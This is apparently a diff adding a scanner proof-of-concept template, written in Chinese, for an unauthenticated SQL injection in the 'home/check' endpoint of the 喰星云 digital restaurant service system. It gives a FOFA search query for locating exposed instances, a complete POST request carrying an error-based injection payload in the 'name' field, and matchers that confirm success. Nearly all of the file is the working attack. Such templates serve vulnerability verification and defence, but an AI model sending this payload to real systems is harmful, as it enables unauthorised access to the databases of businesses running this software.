@@ -1,0 +1,22 @@
+## id: VEID-2025-1202
+## name: 喰星云·数字化餐饮服务系统home_check存在SQL注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2025
+## description: 该系统的一个关键接口 home/check 存在严重的SQL注入漏洞。由于其未对用户访问进行有效的身份验证，导致了未授权访问问题，且未对用户输入的数据进行严格的过滤和验证。
+## reference: https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%96%B0%E6%98%9F%E4%BA%91%C2%B7%E6%95%B0%E5%AD%97%E5%8C%96%E9%A4%90%E9%A5%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/%E5%96%B0%E6%98%9F%E4%BA%91%C2%B7%E6%95%B0%E5%AD%97%E5%8C%96%E9%A4%90%E9%A5%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Fhome_check%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+## fofa-query: body="tmp_md5_pwd" || title=="喰星云·数字化餐饮服务系统" || body="请使用谷歌浏览器,点击进入下载地址"
+## verification: true
+
+
+POST /chainsales/mobile/home/check HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,MD5(1)))),0x7e),8475) AND '1%'='1&pwd=123
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "text/html"
+#> extract: name=SQLSTATE, from=body, regex=/SQLSTATE\[[A-Z0-9]+]/
